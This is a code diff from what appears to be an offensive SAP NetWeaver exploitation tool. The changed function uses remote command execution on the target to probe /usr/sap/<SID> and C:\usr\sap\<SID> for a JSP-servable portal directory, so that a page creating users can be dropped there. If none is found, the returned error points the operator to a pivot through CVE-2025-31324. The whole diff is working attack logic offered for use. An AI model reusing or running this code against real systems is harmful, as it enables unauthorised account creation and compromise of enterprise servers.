@@ -729,13 +729,38 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
                 r = exec_fn("/usr/bin/test", f"-d {root}")
                 if r.get("success") and r.get("exit_code", 0) == 0:
                     return root
+            # Fallback: enumerate /usr/sap/<SID>/ to find the ACTUAL
+            # instance folder (SCS01, J00, D00, whatever) and look
+            # for the servlet_jsp/irj/root subdir under each.
+            # `ls -1 /usr/sap/<SID>` returns one dir per line; then
+            # /usr/bin/find scoped to each candidate is quick.  Uses
+            # absolute paths because sapstartsrv PATH is restricted.
+            r = exec_fn("/bin/ls", f"-1 {base}")
+            if r.get("success") and r.get("exit_code", 0) == 0:
+                subdirs = [ln.strip() for ln in
+                             (r.get("output") or []) if ln.strip()]
+                # Order by likelihood: J* / JC* / JD* first, then
+                # anything else.  Skip SYS (shared symlinks) and
+                # ASCS/SCS (Central Services — never has IRJ).
+                skip = ("SYS", "SCS", "ASCS", "ERS", "SMDA")
+                subdirs = [d for d in subdirs
+                            if not any(d.startswith(s) for s in skip)]
+                subdirs.sort(
+                    key=lambda d: (0 if d.startswith(("J", "JC"))
+                                    else 1, d))
+                for inst in subdirs:
+                    root = (f"{base}/{inst}/j2ee/cluster/apps/"
+                            f"sap.com/irj/servlet_jsp/irj/root")
+                    r2 = exec_fn("/usr/bin/test", f"-d {root}")
+                    if r2.get("success") and r2.get(
+                            "exit_code", 0) == 0:
+                        return root
             return None
+        # Windows
         base = fr"C:\usr\sap\{sid}"
         for inst in inst_candidates:
             root = (fr"{base}\{inst}\j2ee\cluster\apps\sap.com\irj"
                     fr"\servlet_jsp\irj\root")
-            # cmd.exe if exist "<path>\." echo YES  — no exit
-            # code contract on missing paths, so grep the output.
             r = exec_fn("cmd.exe",
                          f'/C if exist "{root}\\." (echo YES) '
                          f'else (echo NO)')
@@ -743,6 +768,27 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
                 str(l) for l in (r.get("output") or [])
             ).strip().upper()
             if "YES" in out:
+                return root
+        # Fallback: enumerate C:\usr\sap\<SID>\ and try each subdir.
+        r = exec_fn("cmd.exe", f'/C dir /B "{base}"')
+        out_lines = [ln.strip() for ln in (r.get("output") or [])
+                      if ln.strip()]
+        skip = ("SYS", "SCS", "ASCS", "ERS", "SMDA")
+        subdirs = [d for d in out_lines
+                    if not any(d.upper().startswith(s) for s in skip)]
+        subdirs.sort(
+            key=lambda d: (0 if d.upper().startswith(("J", "JC"))
+                            else 1, d))
+        for inst in subdirs:
+            root = (fr"{base}\{inst}\j2ee\cluster\apps\sap.com\irj"
+                    fr"\servlet_jsp\irj\root")
+            r2 = exec_fn("cmd.exe",
+                          f'/C if exist "{root}\\." (echo YES) '
+                          f'else (echo NO)')
+            out2 = " ".join(
+                str(l) for l in (r2.get("output") or [])
+            ).strip().upper()
+            if "YES" in out2:
                 return root
         return None
 
@@ -753,19 +799,35 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
         print(f"[+] {node.sid}: probed Java root — using "
               f"{probed_root}")
     else:
-        # Fall back to the canonical path even if we couldn't probe
-        # (e.g. exec_fn returned nothing useful).  If it's wrong,
-        # certutil/openssl will still fail at decode with a clear
-        # PATH_NOT_FOUND we can surface.
-        target_path = (_java_root_path(sid, java_instance_nr,
-                                          os_label)
-                       + ("/" if linux else "\\") + jsp_name)
-        print(f"[!] {node.sid}: could not confirm servlet_jsp/irj/"
-              f"root on any candidate instance dir "
-              f"(J{java_instance_nr:02d}, "
-              f"JC{java_instance_nr:02d}, "
-              f"JD{java_instance_nr:02d}) — falling back to "
-              f"{_java_root_path(sid, java_instance_nr, os_label)}")
+        # Enumerate what IS under /usr/sap/<SID>/ so the operator
+        # can see whether this is a Portal-less install (only
+        # SCS/ASCS present → no IRJ possible) or a non-standard
+        # layout.  Best-effort — surfaces the actual filesystem
+        # state so the diagnostic beats "PATH_NOT_FOUND".
+        base_dir = (f"/usr/sap/{sid}" if linux
+                     else fr"C:\usr\sap\{sid}")
+        if linux:
+            listing = exec_fn("/bin/ls", f"-1 {base_dir}")
+        else:
+            listing = exec_fn("cmd.exe", f'/C dir /B "{base_dir}"')
+        _dirs = " ".join(
+            str(l).strip() for l in (listing.get("output") or [])
+            if str(l).strip())
+        return {
+            "success": False,
+            "error": (f"no writable JSP-servable root found on "
+                       f"target — probed candidates under "
+                       f"{base_dir} did not contain "
+                       f"j2ee/cluster/apps/sap.com/irj/servlet_jsp/"
+                       f"irj/root.  Directory listing of "
+                       f"{base_dir}: [{_dirs[:400] or '<empty>'}].  "
+                       f"If SCS/ASCS is the only instance, Portal "
+                       f"is not installed on this stack and the "
+                       f"UME JSP path can't be used — pivot via "
+                       f"CVE-2025-31324 (already-writable "
+                       f"deployment/pending path) or RECON "
+                       f"(UME REST API on the AS Java)."),
+        }
 
     import random as _r
     import string as _s
